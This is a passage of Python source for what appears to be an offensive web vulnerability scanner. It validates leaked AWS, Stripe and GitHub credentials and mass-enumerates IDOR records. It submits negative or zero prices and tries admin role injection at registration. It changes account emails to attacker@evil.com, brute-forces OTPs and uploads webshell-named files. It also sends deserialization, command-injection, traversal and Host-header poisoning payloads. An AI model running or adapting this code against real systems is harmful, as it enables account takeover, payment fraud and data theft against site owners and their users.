                "severity": "critical",
                "url": key_info["url"],
                "detail": f"AWS Access Key {key} found. Test with: aws sts get-caller-identity --access-key-id {key}",
                "template": "apex-aws-key-exploit",
            })
        except Exception:
            pass

    elif key.startswith("sk_live_"):
        # Stripe secret key — can read all payment data
        try:
            r = requests.get("https://api.stripe.com/v1/charges?limit=1",
                             auth=(key, ""), timeout=5)
            if r.status_code == 200:
                findings.append({
                    "type": "Stripe Secret Key — Full Payment Access",
                    "severity": "critical",
                    "url": key_info["url"],
                    "detail": f"Stripe key {key[:20]}... is LIVE and has access to payment data",
                    "template": "apex-stripe-key-exploit",
                })
        except Exception:
            pass

    elif key.startswith("gh"):
        # GitHub token — check permissions
        try:
            r = requests.get("https://api.github.com/user",
                             headers={"Authorization": f"token {key}"}, timeout=5)
            if r.status_code == 200:
                user = r.json().get("login", "unknown")
                findings.append({
                    "type": f"GitHub Token — Authenticated as {user}",
                    "severity": "critical",
                    "url": key_info["url"],
                    "detail": f"GitHub token valid for user '{user}'. Can access repos, create commits.",
                    "template": "apex-github-token-exploit",
                })
        except Exception:
            pass

    return findings


def _idor_mass_enumerate(idor_endpoints):
    """Mass enumerate resources through confirmed IDOR endpoints."""
    findings = []
    for url in idor_endpoints[:3]:
        # Find the ID parameter
        id_match = re.search(r'([?&/])(id|user_id|account_id|order_id)=(\d+)', url)
        if not id_match:
            continue
        sep, param, current_id = id_match.groups()
        current_id = int(current_id)

        # Enumerate 20 IDs around the current one
        accessible_count = 0
        sample_data = ""
        for test_id in range(max(1, current_id - 10), current_id + 10):
            if test_id == current_id:
                continue
            test_url = re.sub(f'{param}={current_id}', f'{param}={test_id}', url)
            try:
                r = _S.get(test_url, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 50:
                    accessible_count += 1
                    if not sample_data:
                        sample_data = r.text[:200]
            except Exception:
                continue

        if accessible_count > 5:
            findings.append({
                "type": f"Mass IDOR — {accessible_count} Records Accessible",
                "severity": "critical",
                "url": url,
                "detail": f"Enumerated {accessible_count}/19 adjacent IDs via '{param}'. Full database dump possible.",
                "template": "apex-idor-mass",
            })
    return findings


def _xss_to_ato(xss_endpoints, auth_endpoints, web_targets):
    """Document XSS → ATO chain when both XSS and auth endpoints exist."""
    findings = []
    if xss_endpoints:
        # Find cookie-based auth (session cookies without HttpOnly)
        for target in web_targets[:3]:
            try:
                r = _S.get(target, timeout=_TIMEOUT_SHORT)
                for cookie in r.cookies:
                    if any(x in cookie.name.lower() for x in ["session", "token", "auth"]):
                        if "httponly" not in str(getattr(cookie, '_rest', {})).lower():
                            findings.append({
                                "type": "XSS → Account Takeover Chain",
                                "severity": "critical",
                                "url": xss_endpoints[0],
                                "detail": f"XSS at {xss_endpoints[0][:60]} + session cookie '{cookie.name}' without HttpOnly = steal any user's session",
                                "template": "apex-chain-xss-ato",
                            })
                            return findings
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 28 — Business logic deep scan, payment/registration abuse, API abuse
# ---------------------------------------------------------------------------

def scan_payment_logic_deep(crawl_data, web_targets):
    """Deep payment/checkout logic testing — price manipulation, currency confusion, negative values."""
    findings = []
    payment_indicators = ["price", "amount", "total", "cost", "fee", "discount",
                          "quantity", "qty", "coupon", "promo", "checkout", "pay",
                          "cart", "order", "subscription", "plan", "tier"]

    for url, params in list(crawl_data.get("params", {}).items())[:30]:
        for p in params:
            if not any(x in p.lower() for x in payment_indicators):
                continue

            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)

            # Test negative values
            for evil_val in ["-1", "0", "0.01", "-999", "99999999", "NaN", "Infinity", "null"]:
                qs[p] = [evil_val]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 200:
                        # Check if the manipulated value was accepted
                        if evil_val in r.text or "success" in r.text.lower():
                            if "error" not in r.text.lower()[:200] and "invalid" not in r.text.lower()[:200]:
                                findings.append({
                                    "type": f"Payment Logic Flaw — {p}={evil_val}",
                                    "severity": "critical",
                                    "url": test_url,
                                    "detail": f"Param '{p}' accepts value '{evil_val}' without validation. Possible free purchase or credit manipulation.",
                                    "template": "apex-payment-logic",
                                })
                                break
                except Exception:
                    continue

    # Test POST endpoints for price manipulation
    for form in crawl_data.get("forms", [])[:15]:
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        price_fields = [i for i in inputs if any(x in i.get("name", "").lower() for x in payment_indicators)]
        if not price_fields:
            continue

        for field in price_fields:
            for evil_val in ["0", "-1", "0.001"]:
                data = {i.get("name", "x"): i.get("value", "1") for i in inputs if i.get("name")}
                data[field["name"]] = evil_val
                try:
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if r.status_code in (200, 201, 302) and "error" not in r.text.lower()[:200]:
                        findings.append({
                            "type": f"Payment Bypass — {field['name']}={evil_val}",
                            "severity": "critical",
                            "url": action,
                            "detail": f"Form field '{field['name']}' accepts '{evil_val}'. Zero/negative price accepted.",
                            "template": "apex-payment-bypass",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_registration_abuse(crawl_data, web_targets):
    """Registration/signup abuse — duplicate accounts, email manipulation, role injection."""
    findings = []

    # Find registration endpoints
    reg_endpoints = []
    for url in list(crawl_data.get("params", {}).keys()):
        if any(x in url.lower() for x in ["/register", "/signup", "/create-account", "/join"]):
            reg_endpoints.append(url)
    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/register", "/api/signup", "/api/users", "/register", "/signup"]:
            reg_endpoints.append(f"{base}{path}")

    for url in list(set(reg_endpoints))[:5]:
        # Test 1: Email manipulation — register as admin via email tricks
        email_tricks = [
            "admin@target.com",  # Direct admin
            "admin+test@target.com",  # Plus addressing
            "admin%00@target.com",  # Null byte
            "admin@target.com\n",  # Newline
            "ADMIN@TARGET.COM",  # Case sensitivity
        ]
        for email in email_tricks:
            try:
                r = _S.post(url, json={
                    "email": email, "password": "Test123!@#",
                    "username": "apextest", "name": "Test"
                }, timeout=_TIMEOUT)
                if r.status_code in (200, 201):
                    if "error" not in r.text.lower()[:100] and "exists" not in r.text.lower():
                        findings.append({
                            "type": "Registration Abuse — Admin Email Accepted",
                            "severity": "high",
                            "url": url,
                            "detail": f"Registration accepts '{email}' — possible admin account creation or takeover",
                            "template": "apex-reg-abuse",
                        })
                        break
            except Exception:
                continue

        # Test 2: Role injection during registration
        try:
            r = _S.post(url, json={
                "email": "apextest@test.com", "password": "Test123!@#",
                "role": "admin", "is_admin": True, "user_type": "staff"
            }, timeout=_TIMEOUT)
            if r.status_code in (200, 201):
                resp = r.text.lower()
                if "admin" in resp or "staff" in resp:
                    if "error" not in resp[:100]:
                        findings.append({
                            "type": "Mass Assignment — Admin Role on Registration",
                            "severity": "critical",
                            "url": url,
                            "detail": "Registration endpoint accepts role/is_admin/user_type params — instant admin access",
                            "template": "apex-reg-role-inject",
                        })
        except Exception:
            pass
    return findings


def scan_api_abuse_patterns(crawl_data, web_targets):
    """API abuse patterns — excessive data exposure, batch operations, resource exhaustion."""
    findings = []

    for target in web_targets[:5]:
        base = target.rstrip("/")

        # Test 1: Excessive data exposure — request all fields
        api_urls = [u for u in crawl_data.get("params", {}).keys()
                    if "/api/" in u or "/v1/" in u or "/v2/" in u]
        for url in api_urls[:10]:
            try:
                # Try requesting with fields=* or include=all
                for param in ["fields", "include", "expand", "select"]:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}=*"
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    r_base = _S.get(url, timeout=_TIMEOUT)
                    if r.status_code == 200 and len(r.text) > len(r_base.text) + 500:
                        findings.append({
                            "type": f"Excessive Data Exposure ({param}=*)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Adding {param}=* returns {len(r.text)-len(r_base.text)} extra bytes — hidden fields exposed",
                            "template": "apex-excessive-data",
                        })
                        break
            except Exception:
                continue

        # Test 2: Batch/bulk operations without rate limiting
        for path in ["/api/users", "/api/accounts", "/api/orders", "/api/data"]:
            url = f"{base}{path}"
            try:
                # Request with high limit/page_size
                for param in ["limit", "page_size", "per_page", "count", "size"]:
                    test_url = f"{url}?{param}=10000"
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 200 and len(r.text) > 10000:
                        try:
                            data = r.json()
                            if isinstance(data, list) and len(data) > 100:
                                findings.append({
                                    "type": f"API Mass Data Extraction ({param}=10000)",
                                    "severity": "high",
                                    "url": test_url,
                                    "detail": f"API returns {len(data)} records with {param}=10000. No pagination limit enforced.",
                                    "template": "apex-api-mass-extract",
                                })
                                break
                            elif isinstance(data, dict) and "results" in data:
                                results = data["results"]
                                if isinstance(results, list) and len(results) > 100:
                                    findings.append({
                                        "type": f"API Mass Data Extraction ({param}=10000)",
                                        "severity": "high",
                                        "url": test_url,
                                        "detail": f"API returns {len(results)} records. No pagination limit.",
                                        "template": "apex-api-mass-extract",
                                    })
                                    break
                        except Exception:
                            pass
            except Exception:
                continue
    return findings


def scan_account_takeover_flows(crawl_data, web_targets):
    """Test all account takeover vectors — password reset, email change, phone change."""
    findings = []

    for target in web_targets[:3]:
        base = target.rstrip("/")

        # Test 1: Password reset token in response
        for path in ["/api/forgot-password", "/api/reset-password", "/forgot-password",
                     "/api/password/reset", "/auth/forgot"]:
            url = f"{base}{path}"
            try:
                r = _S.post(url, json={"email": "test@test.com"}, timeout=_TIMEOUT)
                if r.status_code == 200:
                    # Check if reset token/link is in the response body
                    if any(x in r.text.lower() for x in ["token", "reset_token", "resettoken", "otp"]):
                        try:
                            data = r.json()
                            token_fields = [k for k in data.keys()
                                            if any(x in k.lower() for x in ["token", "otp", "code", "reset"])]
                            if token_fields:
                                findings.append({
                                    "type": "Password Reset Token in Response",
                                    "severity": "critical",
                                    "url": url,
                                    "detail": f"Reset token returned in API response (fields: {token_fields}). Any account takeover possible.",
                                    "template": "apex-ato-reset-token",
                                })
                        except Exception:
                            pass
            except Exception:
                continue

        # Test 2: Email/phone change without re-authentication
        for path in ["/api/user/email", "/api/profile", "/api/account/settings",
                     "/api/user/update", "/api/me"]:
            url = f"{base}{path}"
            try:
                r = _S.put(url, json={"email": "attacker@evil.com"}, timeout=_TIMEOUT)
                if r.status_code in (200, 204):
                    if "error" not in r.text.lower()[:100] and "unauthorized" not in r.text.lower():
                        findings.append({
                            "type": "Email Change Without Re-Authentication",
                            "severity": "high",
                            "url": url,
                            "detail": "Email can be changed without password confirmation — ATO via email change",
                            "template": "apex-ato-email-change",
                        })
                r2 = _S.patch(url, json={"email": "attacker@evil.com"}, timeout=_TIMEOUT)
                if r2.status_code in (200, 204) and "error" not in r2.text.lower()[:100]:
                    findings.append({
                        "type": "Email Change Without Re-Authentication (PATCH)",
                        "severity": "high",
                        "url": url,
                        "detail": "PATCH to change email accepted without password — ATO possible",
                        "template": "apex-ato-email-change",
                    })
            except Exception:
                continue

        # Test 3: No rate limit on OTP/2FA
        for path in ["/api/verify-otp", "/api/2fa/verify", "/api/auth/otp", "/verify"]:
            url = f"{base}{path}"
            success_count = 0
            try:
                for otp in ["000000", "111111", "123456", "999999", "000001"]:
                    r = _S.post(url, json={"otp": otp, "code": otp}, timeout=_TIMEOUT_SHORT)
                    if r.status_code in (200, 401, 400):
                        success_count += 1
                if success_count >= 5:
                    findings.append({
                        "type": "OTP/2FA Brute-Force Possible",
                        "severity": "high",
                        "url": url,
                        "detail": f"OTP endpoint accepts {success_count}/5 attempts without rate limiting. 6-digit OTP crackable in <1000 requests.",
                        "template": "apex-ato-otp-bruteforce",
                    })
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 29 — File upload bypass, deserialization RCE, host header poisoning
# ---------------------------------------------------------------------------

def scan_file_upload_bypass(crawl_data):
    """File upload bypass — test extension filters, content-type confusion, polyglot files."""
    findings = []
    upload_forms = [f for f in crawl_data.get("forms", [])
                    if any(i.get("type") == "file" for i in f.get("inputs", []))]

    if not upload_forms:
        # Try to find upload endpoints from URLs
        for url in list(crawl_data.get("params", {}).keys())[:20]:
            if any(x in url.lower() for x in ["upload", "attach", "import", "file"]):
                upload_forms.append({"action": url, "inputs": [{"name": "file", "type": "file"}]})

    for form in upload_forms[:5]:
        action = form.get("action", "")
        if not action:
            continue

        # Bypass payloads: extension tricks
        bypass_filenames = [
            ("shell.php", "application/x-php"),
            ("shell.php.jpg", "image/jpeg"),
            ("shell.pHp", "application/x-php"),
            ("shell.php%00.jpg", "image/jpeg"),
            ("shell.php;.jpg", "image/jpeg"),
            ("shell.phtml", "application/x-php"),
            ("shell.php5", "application/x-php"),
            ("shell.shtml", "text/html"),
            ("shell.asp", "application/x-asp"),
            ("shell.aspx", "application/x-aspx"),
            ("shell.jsp", "application/x-jsp"),
            ("..%2fshell.php", "application/x-php"),
            ("shell.svg", "image/svg+xml"),
        ]

        # PHP webshell content
        php_content = b"<?php echo 'APEX_UPLOAD_TEST'; ?>"
        svg_xss = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'

        for filename, content_type in bypass_filenames[:6]:
            content = svg_xss if filename.endswith(".svg") else php_content
            try:
                files = {"file": (filename, content, content_type)}
                # Also try with different field names
                for field_name in ["file", "upload", "attachment", "image", "document"]:
                    files = {field_name: (filename, content, content_type)}
                    r = _S.post(action, files=files, timeout=_TIMEOUT)
                    if r.status_code in (200, 201):
                        # Check if file was uploaded and accessible
                        if any(x in r.text.lower() for x in ["uploaded", "success", "url", "path", "filename"]):
                            # Try to find the uploaded file URL
                            url_match = re.search(r'https?://[^\s"\'<>]+' + re.escape(filename.split(".")[0]), r.text)
                            findings.append({
                                "type": f"File Upload Bypass ({filename})",
                                "severity": "critical" if ".php" in filename.lower() else "high",
                                "url": action,
                                "detail": f"Uploaded '{filename}' as {content_type} — accepted. Possible RCE via webshell.",
                                "template": "apex-upload-bypass",
                            })
                            break
            except Exception:
                continue
    return findings


def scan_deserialization_rce(crawl_data, web_targets):
    """Insecure deserialization detection — Java, PHP, Python, .NET."""
    findings = []
    import base64 as b64

    # Java serialization magic bytes
    java_magic = b64.b64encode(b"\xac\xed\x00\x05").decode()

    # PHP serialization
    php_payloads = [
        'O:8:"stdClass":0:{}',
        'a:1:{s:4:"test";s:4:"apex";}',
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}',
    ]

    # Python pickle
    python_pickle = b64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode()

    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params:
            if not any(x in p.lower() for x in ["data", "token", "session", "state",
                                                   "object", "payload", "serialized",
                                                   "viewstate", "cache", "value"]):
                continue

            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)

            # Test PHP deserialization
            for payload in php_payloads:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 200 and "unserialize" not in r.text.lower():
                        if r.status_code != 500:
                            continue
                    if r.status_code == 500:
                        if any(x in r.text.lower() for x in ["unserialize", "object", "__wakeup",
                                                               "deserializ", "class not found"]):
                            findings.append({
                                "type": "PHP Insecure Deserialization",
                                "severity": "critical",
                                "url": test_url,
                                "detail": f"Param '{p}' triggers PHP deserialization error — RCE via POP chain likely",
                                "template": "apex-deser-php",
                            })
                            break
                except Exception:
                    continue

            # Test Java deserialization
            qs[p] = [java_magic]
            test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
            try:
                r = _S.get(test_url, timeout=_TIMEOUT)
                if r.status_code == 500:
                    if any(x in r.text.lower() for x in ["java.io", "objectinputstream",
                                                           "classnotfound", "deserializ",
                                                           "invalidclassexception"]):
                        findings.append({
                            "type": "Java Insecure Deserialization",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Param '{p}' triggers Java deserialization — RCE via ysoserial gadget chains",
                            "template": "apex-deser-java",
                        })
            except Exception:
                pass
    return findings


def scan_host_header_poison(web_targets):
    """Host header poisoning — password reset poisoning, cache poisoning, SSRF."""
    findings = []

    for target in web_targets[:8]:
        parsed = urllib.parse.urlparse(target)
        original_host = parsed.netloc

        # Test 1: Host header override
        evil_hosts = [
            "evil.com",
            f"{original_host}.evil.com",
            f"evil.com/{original_host}",
        ]

        for evil_host in evil_hosts:
            try:
                r = _S.get(target, headers={"Host": evil_host}, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and evil_host in r.text:
                    findings.append({
                        "type": "Host Header Injection — Reflected",
                        "severity": "high",
                        "url": target,
                        "detail": f"Host: {evil_host} reflected in response. Password reset poisoning / cache poisoning possible.",
                        "template": "apex-host-header",
                    })
                    break
            except Exception:
                continue

        # Test 2: X-Forwarded-Host for password reset poisoning
        base = target.rstrip("/")
        for path in ["/forgot-password", "/api/forgot-password", "/reset-password",
                     "/api/password/reset", "/auth/forgot"]:
            url = f"{base}{path}"
            try:
                r = _S.post(url,
                            json={"email": "test@test.com"},
                            headers={"X-Forwarded-Host": "evil.com", "Host": original_host},
                            timeout=_TIMEOUT)
                if r.status_code in (200, 201, 202):
                    # If the reset link would use our evil host
                    if "evil.com" in r.text:
                        findings.append({
                            "type": "Password Reset Poisoning via X-Forwarded-Host",
                            "severity": "critical",
                            "url": url,
                            "detail": "Password reset email uses X-Forwarded-Host value — attacker receives reset link",
                            "template": "apex-host-reset-poison",
                        })
            except Exception:
                continue
    return findings


def scan_graphql_deep_exploit(crawl_data):
    """Deep GraphQL exploitation — nested queries, DoS, data exfil via aliases."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)

        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Test if GraphQL exists
                r = _S.post(url, json={"query": "{ __typename }"}, timeout=_TIMEOUT_SHORT)
                if r.status_code != 200:
                    continue

                # Test 1: Alias-based data exfil (bypass field-level auth)
                alias_query = """query {
                    a1: __type(name: "User") { fields { name type { name } } }
                    a2: __type(name: "Admin") { fields { name type { name } } }
                    a3: __type(name: "Account") { fields { name type { name } } }
                    a4: __type(name: "Payment") { fields { name type { name } } }
                    a5: __type(name: "Order") { fields { name type { name } } }
                }"""
                r2 = _S.post(url, json={"query": alias_query}, timeout=_TIMEOUT)
                if r2.status_code == 200:
                    try:
                        data = r2.json().get("data", {})
                        exposed_types = [k for k, v in data.items() if v is not None]
                        if exposed_types:
                            fields_found = []
                            for k, v in data.items():
                                if v and v.get("fields"):
                                    fields_found.extend([f["name"] for f in v["fields"]])
                            sensitive = [f for f in fields_found if any(x in f.lower()
                                         for x in ["password", "secret", "token", "ssn", "credit"])]
                            if sensitive:
                                findings.append({
                                    "type": "GraphQL Type Introspection — Sensitive Fields",
                                    "severity": "high",
                                    "url": url,
                                    "detail": f"Exposed types: {exposed_types}. Sensitive fields: {sensitive[:5]}",
                                    "template": "apex-graphql-type-leak",
                                })
                    except Exception:
                        pass

                # Test 2: Batch query abuse for data exfil
                batch = [{"query": f"{{ __type(name: \"Query\") {{ fields {{ name }} }} }}"} for _ in range(100)]
                r3 = _S.post(url, json=batch, timeout=_TIMEOUT)
                if r3.status_code == 200:
                    try:
                        if isinstance(r3.json(), list) and len(r3.json()) >= 100:
                            findings.append({
                                "type": "GraphQL Batch Query — No Limit",
                                "severity": "medium",
                                "url": url,
                                "detail": "Accepts 100+ batched queries — DoS and rate limit bypass",
                                "template": "apex-graphql-batch-nolimit",
                            })
                    except Exception:
                        pass

                break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# Batch 30 — Pushing limits: Response oracle, mutation fuzzer, context inference,
#             behavioral analysis, and AI-guided attack surface mapping
# ---------------------------------------------------------------------------

def scan_response_oracle(crawl_data, web_targets):
    """Response oracle — learns the application's normal behavior, then detects ANY anomaly.
    This is the closest thing to a human pentester's intuition in code.
    
    Technique: Build a behavioral model of the app (response sizes, status codes, headers,
    timing per endpoint), then test every param with every payload and flag ANY deviation
    from the model. Catches zero-days that signature-based scanners can never find."""
    findings = []

    # Phase 1: Build behavioral model
    model = {}  # url_base -> {avg_size, avg_time, status, headers_set, content_type}
    for url in list(crawl_data.get("params", {}).keys())[:30]:
        base_url = url.split("?")[0]
        if base_url in model:
            continue
        try:
            times = []
            sizes = []
            for _ in range(3):
                t0 = time.time()
                r = _S.get(url, timeout=_TIMEOUT)
                times.append(time.time() - t0)
                sizes.append(len(r.text))
            model[base_url] = {
                "avg_size": sum(sizes) / len(sizes),
                "avg_time": sum(times) / len(times),
                "status": r.status_code,
                "headers": set(r.headers.keys()),
                "content_type": r.headers.get("content-type", ""),
                "url": url,
            }
        except Exception:
            continue

    if not model:
        return findings

    # Phase 2: Fuzz with anomaly detection
    # Universal payloads that trigger different bug classes
    universal_payloads = [
        # Memory corruption / buffer overflow indicators
        "A" * 10000,
        "%n" * 100,
        "${" + "A" * 500 + "}",
        # Type confusion
        "[]", "{}", "null", "undefined", "NaN", "true",
        "0", "-0", "1e308", "-1e308",
        # Injection polyglots
        "{{7*7}}${7*7}<%=7*7%><%= 7*7 %>#{7*7}",
        "' OR ''='",
        '"><img src=x>',
        "../" * 20 + "etc/passwd",
        # Format string
        "%s%s%s%s%s%s%s%s%s%s",
        "%x" * 50,
        # LDAP/XPath
        "*)(&", "'][1]",
        # Command injection
        "`id`", "$(id)", "|id", ";id",
        # Unicode edge cases
        "\x00", "\xff" * 10, "𝕳𝖊𝖑𝖑𝖔",
        # Integer overflow
        "2147483648", "-2147483649", "9" * 20,
    ]

    for base_url, baseline in model.items():
        url = baseline["url"]
        params = crawl_data.get("params", {}).get(url, [])
        for p in params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)

            for payload in universal_payloads:
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    t0 = time.time()
                    r = _S.get(test_url, timeout=max(_TIMEOUT, baseline["avg_time"] * 5))
                    elapsed = time.time() - t0

                    # Anomaly detection
                    anomalies = []

                    # Status code change (not just 400/404)
                    if r.status_code == 500:
                        anomalies.append(f"500 error (baseline: {baseline['status']})")
                    elif r.status_code != baseline["status"] and r.status_code not in (400, 404, 422):
                        anomalies.append(f"status {r.status_code} (baseline: {baseline['status']})")

                    # Response size anomaly (>3x or <0.3x baseline)
                    size = len(r.text)
                    if baseline["avg_size"] > 100:
                        if size > baseline["avg_size"] * 3:
                            anomalies.append(f"response {size}B vs baseline {baseline['avg_size']:.0f}B (3x larger)")
                        elif size < baseline["avg_size"] * 0.1 and size > 0:
                            anomalies.append(f"response {size}B vs baseline {baseline['avg_size']:.0f}B (10x smaller)")

                    # Timing anomaly (>3x slower)
                    if elapsed > baseline["avg_time"] * 3 + 1.0:
                        anomalies.append(f"response time {elapsed:.2f}s vs baseline {baseline['avg_time']:.2f}s")

                    # New headers appeared (debug/error headers)
                    new_headers = set(r.headers.keys()) - baseline["headers"]
                    interesting_headers = [h for h in new_headers
                                           if any(x in h.lower() for x in ["debug", "error", "trace", "x-"])]
                    if interesting_headers:
                        anomalies.append(f"new headers: {interesting_headers}")

                    # Error patterns in body
                    error_indicators = ["stack trace", "traceback", "exception", "fatal",
                                        "segfault", "core dump", "panic:", "runtime error"]
                    if any(x in r.text.lower() for x in error_indicators):
                        anomalies.append("error/crash indicator in response")

                    if anomalies:
                        # Determine severity based on anomaly type
                        severity = "medium"
                        if "500" in str(anomalies) or "crash" in str(anomalies):
                            severity = "high"
                        if "time" in str(anomalies) and elapsed > 3:
                            severity = "high"  # Possible blind injection
                        if any(x in r.text.lower() for x in ["sql", "mysql", "postgres", "oracle"]):
                            severity = "critical"

                        findings.append({
                            "type": f"Behavioral Anomaly ({p})",
                            "severity": severity,
                            "url": test_url,
                            "detail": f"Payload '{payload[:30]}' triggers: {'; '.join(anomalies)}",
                            "template": "apex-oracle-anomaly",
                        })
                        break  # One anomaly per param is enough
                except Exception:
                    continue
    return findings


def scan_mutation_fuzzer(crawl_data):
    """Mutation-based fuzzer — takes valid requests and mutates them systematically.
    Inspired by AFL/libFuzzer but for HTTP. Mutates known-good values to find edge cases."""
    findings = []

    # Mutation strategies
    def mutate(value):
        """Generate mutations of a value."""
        mutations = [
            value + "'",
            value + '"',
            value + "\\",
            value + "\x00",
            value * 100,  # repeat
            value[::-1],  # reverse
            value.replace("a", "%00"),
            str(int(value) + 1) if value.isdigit() else value + "1",
            str(int(value) - 1) if value.isdigit() else value,
            "-" + value if value.isdigit() else value,
            value + "{{7*7}}",
            value + "${7*7}",
            value + "' OR '1'='1",
            value + "<script>",
            value + "../../../etc/passwd",
            "null",
            "",
            " " + value,
            value + " ",
        ]
        return mutations

    for url, params in list(crawl_data.get("params", {}).items())[:15]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)

        for p in params[:3]:
            original_val = qs.get(p, [""])[0] if qs.get(p) else "test"
            if not original_val:
                continue

            # Get baseline
            try:
                r_base = _S.get(url, timeout=_TIMEOUT)
                base_status = r_base.status_code
                base_size = len(r_base.text)
            except Exception:
                continue

            # Test mutations
            for mutated in mutate(original_val)[:10]:
                qs[p] = [mutated]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    # Interesting if: 500 error, massive size change, or error keywords
                    if r.status_code == 500 and base_status != 500:
                        findings.append({
                            "type": f"Mutation Crash ({p})",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Mutating '{original_val}' → '{mutated[:40]}' causes 500. Unhandled input.",
                            "template": "apex-mutation-crash",
                        })
                        break
                    if any(x in r.text.lower() for x in ["exception", "traceback", "stack trace",
                                                           "syntax error", "fatal"]):
                        if "exception" not in r_base.text.lower():
                            findings.append({
                                "type": f"Mutation Error Disclosure ({p})",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"Mutation '{mutated[:30]}' triggers error disclosure not in baseline",
                                "template": "apex-mutation-error",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_access_control_matrix(crawl_data, web_targets):
    """Build and test access control matrix — find endpoints with inconsistent auth."""
    findings = []

    # Collect all discovered endpoints
    all_urls = set()
    for url in crawl_data.get("params", {}).keys():
        all_urls.add(url.split("?")[0])
    for page in crawl_data.get("pages", []):
        all_urls.add(page["url"].split("?")[0])

    # Categorize by likely auth requirement
    public_urls = set()
    auth_urls = set()

    # First pass: check which return 200 vs 401/403
    test_results = {}
    url_list = list(all_urls)[:50]
    for url, r in batch_get(url_list, timeout=_TIMEOUT_SHORT):
        if r is None:
            continue
        test_results[url] = r.status_code
        if r.status_code == 200:
            public_urls.add(url)
        elif r.status_code in (401, 403):
            auth_urls.add(url)

    # Find inconsistencies: similar endpoints with different auth requirements
    for auth_url in auth_urls:
        path_parts = auth_url.rstrip("/").split("/")
        for pub_url in public_urls:
            pub_parts = pub_url.rstrip("/").split("/")
            # Same base path but different auth = inconsistency
            if len(path_parts) == len(pub_parts) and path_parts[:-1] == pub_parts[:-1]:
                findings.append({
                    "type": "Access Control Inconsistency",
                    "severity": "medium",
                    "url": pub_url,
                    "detail": f"'{pub_url}' is public but sibling '{auth_url}' requires auth. Check for auth bypass.",
                    "template": "apex-acl-inconsistency",
                })

    # Test HTTP method inconsistency
    for url in list(auth_urls)[:10]:
        for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]:
            try:
                r = _S.request(method, url, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 50:
                    findings.append({
                        "type": f"Auth Bypass via HTTP Method ({method})",
                        "severity": "high",
                        "url": url,
                        "detail": f"GET returns 401/403 but {method} returns 200. Method-based access control bypass.",
                        "template": "apex-acl-method-bypass",
                    })
                    break
            except Exception:
                continue

    return findings


def scan_business_flow_abuse(crawl_data, web_targets):
    """Business flow abuse — skip steps, replay, reorder multi-step processes."""
    findings = []

    # Find multi-step flows (checkout, registration, verification)
    flow_indicators = {
        "checkout": ["cart", "checkout", "payment", "confirm", "order", "receipt"],
        "registration": ["register", "verify", "confirm", "activate", "welcome"],
        "password_reset": ["forgot", "reset", "verify", "new-password", "confirm"],
    }

    for target in web_targets[:3]:
        base = target.rstrip("/")

        for flow_name, steps in flow_indicators.items():
            # Try to access later steps directly (skip earlier steps)
            for i, step in enumerate(steps):
                if i == 0:
                    continue  # Skip first step (that's normal entry)
                for prefix in ["/", "/api/"]:
                    url = f"{base}{prefix}{step}"
                    try:
                        r = _S.get(url, timeout=_TIMEOUT_SHORT)
                        if r.status_code == 200 and len(r.text) > 200:
                            if "error" not in r.text.lower()[:100] and "login" not in r.text.lower()[:100]:
                                findings.append({
                                    "type": f"Flow Skip — {flow_name} step '{step}' accessible directly",
                                    "severity": "high" if flow_name == "checkout" else "medium",
                                    "url": url,
                                    "detail": f"Step {i+1}/{len(steps)} of {flow_name} flow accessible without completing prior steps",
                                    "template": "apex-flow-skip",
                                })
                    except Exception:
                        continue
    return findings


# ---------------------------------------------------------------------------
# Batch 31 — Theoretical limits: entropy analysis, state machine inference,
#             differential computation, constraint solving, information leakage
# ---------------------------------------------------------------------------

def scan_entropy_analysis(crawl_data, web_targets):
    """Entropy analysis — detect weak randomness in tokens, session IDs, and reset codes.
    
    Theoretically: a truly random N-bit token has entropy = N bits.
    If measured entropy < expected, the token is predictable.
    This is the mathematical proof that a token can be brute-forced."""
    import math
    findings = []

    tokens_collected = defaultdict(list)  # source -> [token_values]

    # Collect tokens from multiple requests to the same endpoint
    for target in web_targets[:5]:
        for _ in range(20):
            try:
